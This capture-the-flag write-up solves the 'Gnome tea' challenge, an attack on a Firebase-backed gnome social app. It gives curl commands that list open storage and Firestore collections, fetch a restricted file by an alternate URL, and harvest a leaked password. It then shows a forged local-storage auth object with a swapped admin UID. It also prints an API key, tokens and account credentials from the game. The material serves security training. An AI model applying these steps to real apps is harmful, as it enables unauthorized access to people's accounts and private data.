---
icon: material/text-box-outline
---

# Act 3: Gnome tea

**Difficulty**: :fontawesome-solid-star::fontawesome-solid-star::fontawesome-solid-star::fontawesome-regular-star::fontawesome-regular-star:<br/>
**Direct link**: [Website](https://gnometea.web.app/login)

## Objective

!!! question "Request"
    Enter the apartment building near 24-7 and help Thomas infiltrate the GnomeTea social network and discover the secret agent passphrase.

??? quote "Thomas Bouve"
    The gnomes have been oddly suspicious and whispering to each other. In fact, I could've sworn I heard them use some sort of secret phrase. When I laughed right next to one, it said "passphrase denied". I asked what that was all about but it just giggled and ran away.<br/>
    I know they've been using GnomeTea to "spill the tea" on one another, but I can't sign up 'cause I'm obviously not a gnome. I could sure use your expertise to infiltrate this app and figure out what their secret passphrase is.<br/>
    I've tried a few things already, but as usual the whole... Uh, what's the word I'm looking for here? Oh right, "endeavor", ended up with the rest of my unfinished projects.


## Solution

Triggering an error in the user interface allows to show that the app uses Firebase as a backend

![Terminal output](../img/objectives/o18/o18_1.png)

- Let's see the local config of that service
https://firebase.google.com/docs/web/learn-more?hl=fr#config-object shows the structure of the config file and what to look for in the Javascript

![Terminal output](../img/objectives/o18/o18_2.png)


- Looking at the JS with one of the config file terms `storageBucket`:
`https://gnometea.web.app/assets/index-BVLyJWJ_.js`

We see a lot of information related to that app, and specifically the database name:
```
{
    apiKey:"AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk",
    authDomain:"holidayhack2025.firebaseapp.com",
    projectId:"holidayhack2025",
    storageBucket:"holidayhack2025.firebasestorage.app",
    messagingSenderId:"341227752777",
    appId:"1:341227752777:web:7b9017d3d2d83ccf481e98"
}
```

- Let's see if we can access that bucket online<br/>
`curl https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o`<br/>
It contains gnomes'profile picture and drivers licenses. We can download and analyze them to get more information
![Terminal output](../img/objectives/o18/o18_3.png)

All files in the bucket are accessible, except the one at this location: <br/>
`https://storage.googleapis.com/holidayhack2025.firebasestorage.app/gnome-documents/l7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg`<br/>

Can we use another URL to access it?<br/>

`curl "https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/gnome-documents%2Fl7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg?alt=media" -o dl1.jpeg`<br/>

![Terminal output](../img/objectives/o18/o18_4.png)

And yes we can, seems like the file has been donwloaded


- Use an online exif tool analyzer to extract information from the image file
![Terminal output](../img/objectives/o18/o18_6.png)

The file contains GPS coordinates about where it was taken: **33 deg 27' 53.85" S, 115 deg 54' 37.62" E**

We can put it in Google Maps to see where it leads to.
![Terminal output](../img/objectives/o18/o18_7.png)
Seems like it links to a town called Gnomesville, quite a cute unusual place!!


- Let's explore the address with google maps
![Terminal output](../img/objectives/o18/o18_8.png)

- Explore the local DB storage for the app
![Terminal output](../img/objectives/o18/o18_9.png)

- Access the fbase_key file<br/>
`curl https://gnometea.web.app/fbase_key`

![Terminal output](../img/objectives/o18/o18_10.png)

Now we know the name of the collections (important, because firebase does not allow to list collections)

- Try to access the different collections and see if one of the gnomes casually mentions someone password while spilling the tea
    - Reading the **tea** collection<br/>
`curl "https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/tea"|grep pass`<br/>
![Terminal output](../img/objectives/o18/o18_11.png)

And yes, they do!
    - Reading the **dms** collection
`curl "https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms`<br/>

- Let's look for the email address of Barnaby Briefcase to get access to the account<br/>
`curl "https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/gnomes"|grep barnab`<br/>
![Terminal output](../img/objectives/o18/o18_12.png)


We now have a complete set of credentials to login to the Gnome app:<br/>
```
Email: barnabybriefcase@gnomemail.dosis
Password: "MakeRColdOutside123!"
```

![Terminal output](../img/objectives/o18/o18_13.png)<br/>

It still do not work, maybe it was changed after being divulged on a public forum?<br/>

Let's check the dms from Barnaby

![Terminal output](../img/objectives/o18/o18_14.png)

Ok, so now we understand better, the password is the name of the town with the Gnomes: **gnomesville**

Now we successfully logged into the App

![Terminal output](../img/objectives/o18/o18_15.png)

- However, we cannot yet access the admin page 

![Terminal output](../img/objectives/o18/o18_16.png)

- By inspecting the storage of the web app, we notice a key associated with the user<br/>
`firebase:authUser:AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk:[DEFAULT] :"{"fbase_key":"firebase:authUser:AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk:[DEFAULT]","value":{"uid":"l7VS01K9GKV5ir5S8suDcwOFEpp2","email":"barnabybriefcase@gnomemail.dosis","emailVerified":true,"displayName":"Barnaby Briefcase","isAnonymous":false,"providerData":[{"providerId":"password","uid":"barnabybriefcase@gnomemail.dosis","displayName":"Barnaby Briefcase","email":"barnabybriefcase@gnomemail.dosis","phoneNumber":null,"photoURL":null}],"stsTokenManager":{"refreshToken":"AMf-vByq4902_YbTlqMlR1bveDQPp3RxD6UIvQkVuJIO7-wpydiarQo3neDHFOCLgZwNRjw5YJcqXq6Gut3NrE2tJKvX5MJOzb0Tux0-cdJV2dT5sX2_7oUh3oDCVv1P1CB_idoKROsKlzV6pF_7Bloc_8lVMao3B-UxdlY9JFLHfAlIAYjCtEztnavrgG_23C1x9ZPFubm9PBNNm_DrsrBX0wtCs5euGQAKMQzK9p00Y_14g7kaBoAaUl1yC-HUFEGEKGJwDjME","accessToken":"eyJhbGciOiJSUzI1NiIsImtpZCI6IjM4MTFiMDdmMjhiODQxZjRiNDllNDgyNTg1ZmQ2NmQ1NWUzOGRiNWQiLCJ0eXAiOiJKV1QifQ.eyJuYW1lIjoiQmFybmFieSBCcmllZmNhc2UiLCJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vaG9saWRheWhhY2syMDI1IiwiYXVkIjoiaG9saWRheWhhY2syMDI1IiwiYXV0aF90aW1lIjoxNzY1OTQxODM2LCJ1c2VyX2lkIjoibDdWUzAxSzlHS1Y1aXI1UzhzdURjd09GRXBwMiIsInN1YiI6Imw3VlMwMUs5R0tWNWlyNVM4c3VEY3dPRkVwcDIiLCJpYXQiOjE3NjU5NDE4MzYsImV4cCI6MTc2NTk0NTQzNiwiZW1haWwiOiJiYXJuYWJ5YnJpZWZjYXNlQGdub21lbWFpbC5kb3NpcyIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7ImVtYWlsIjpbImJhcm5hYnlicmllZmNhc2VAZ25vbWVtYWlsLmRvc2lzIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc3dvcmQifX0.BqZ9Pr9ITyqCB4g2gt5dSkHJa-xD4GrdhV5UdNOBsJKsmxgCikTPXzvhEP4sEmtnZcuaYnCHSC_AxaWdRcGQnvkmntnKjTrru7hGvpwBPtqwedpYg2VnIJY6Nd97hbBBL5FscMzM01wEMZobbXnaoZT-ES1Rbx7FL4F2F4uePcABnRDFfII7HBp-CW36In_N-B_TzoNf1va72RwP12EB1NMUMFu9wlCJ9vZB4lALn9IwVrm7qcUuUiOBjvzOdHadHcr2EZSgq_cU9F0W60FclCB8p8MYw46bJLW18McKA4HES5E3Cqs8hErM0GhqrmxTecx5rCcLEpfKlrl8rgammw","expirationTime":1765945435581},"createdAt":"1759256487470","lastLoginAt":"1765941836122","apiKey":"AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk","appName":"[DEFAULT]"}}"`<br/>


- Can we access the admin page?<br/>

![Terminal output](../img/objectives/o18/o18_17.png)

![Terminal output](../img/objectives/o18/o18_18.png)

- Let's  change the uid of Barnaby to the one of the admin that we found in the javascript<br/>
![Terminal output](../img/objectives/o18/o18_19.png)

Delete the existing firebase stored data and recreate it by changing the UID to the one of the admin: **3loaihgxP0VwCTKmkHHFLe6FZ4m2**<br/>

`firebase:authUser:AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk:[DEFAULT] :"{"fbase_key":"firebase:authUser:AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk:[DEFAULT]","value":{"uid":"3loaihgxP0VwCTKmkHHFLe6FZ4m2","email":"barnabybriefcase@gnomemail.dosis","emailVerified":true,"displayName":"Barnaby Briefcase","isAnonymous":false,"providerData":[{"providerId":"password","uid":"barnabybriefcase@gnomemail.dosis","displayName":"Barnaby Briefcase","email":"barnabybriefcase@gnomemail.dosis","phoneNumber":null,"photoURL":null}],"stsTokenManager":{"refreshToken":"AMf-vByq4902_YbTlqMlR1bveDQPp3RxD6UIvQkVuJIO7-wpydiarQo3neDHFOCLgZwNRjw5YJcqXq6Gut3NrE2tJKvX5MJOzb0Tux0-cdJV2dT5sX2_7oUh3oDCVv1P1CB_idoKROsKlzV6pF_7Bloc_8lVMao3B-UxdlY9JFLHfAlIAYjCtEztnavrgG_23C1x9ZPFubm9PBNNm_DrsrBX0wtCs5euGQAKMQzK9p00Y_14g7kaBoAaUl1yC-HUFEGEKGJwDjME","accessToken":"eyJhbGciOiJSUzI1NiIsImtpZCI6IjM4MTFiMDdmMjhiODQxZjRiNDllNDgyNTg1ZmQ2NmQ1NWUzOGRiNWQiLCJ0eXAiOiJKV1QifQ.eyJuYW1lIjoiQmFybmFieSBCcmllZmNhc2UiLCJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vaG9saWRheWhhY2syMDI1IiwiYXVkIjoiaG9saWRheWhhY2syMDI1IiwiYXV0aF90aW1lIjoxNzY1OTQxODM2LCJ1c2VyX2lkIjoibDdWUzAxSzlHS1Y1aXI1UzhzdURjd09GRXBwMiIsInN1YiI6Imw3VlMwMUs5R0tWNWlyNVM4c3VEY3dPRkVwcDIiLCJpYXQiOjE3NjU5NDE4MzYsImV4cCI6MTc2NTk0NTQzNiwiZW1haWwiOiJiYXJuYWJ5YnJpZWZjYXNlQGdub21lbWFpbC5kb3NpcyIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7ImVtYWlsIjpbImJhcm5hYnlicmllZmNhc2VAZ25vbWVtYWlsLmRvc2lzIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc3dvcmQifX0.BqZ9Pr9ITyqCB4g2gt5dSkHJa-xD4GrdhV5UdNOBsJKsmxgCikTPXzvhEP4sEmtnZcuaYnCHSC_AxaWdRcGQnvkmntnKjTrru7hGvpwBPtqwedpYg2VnIJY6Nd97hbBBL5FscMzM01wEMZobbXnaoZT-ES1Rbx7FL4F2F4uePcABnRDFfII7HBp-CW36In_N-B_TzoNf1va72RwP12EB1NMUMFu9wlCJ9vZB4lALn9IwVrm7qcUuUiOBjvzOdHadHcr2EZSgq_cU9F0W60FclCB8p8MYw46bJLW18McKA4HES5E3Cqs8hErM0GhqrmxTecx5rCcLEpfKlrl8rgammw","expirationTime":1765945435581},"createdAt":"1759256487470","lastLoginAt":"1765941836122","apiKey":"AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk","appName":"[DEFAULT]"}}"`<br/>

It works! We have now access to the secured information.<br/>

### Solution
Passphrase: **GigGigglesGiggler**

![Terminal output](../img/objectives/o18/o18_20.png)

![Terminal output](../img/objectives/o18/o18_21.png)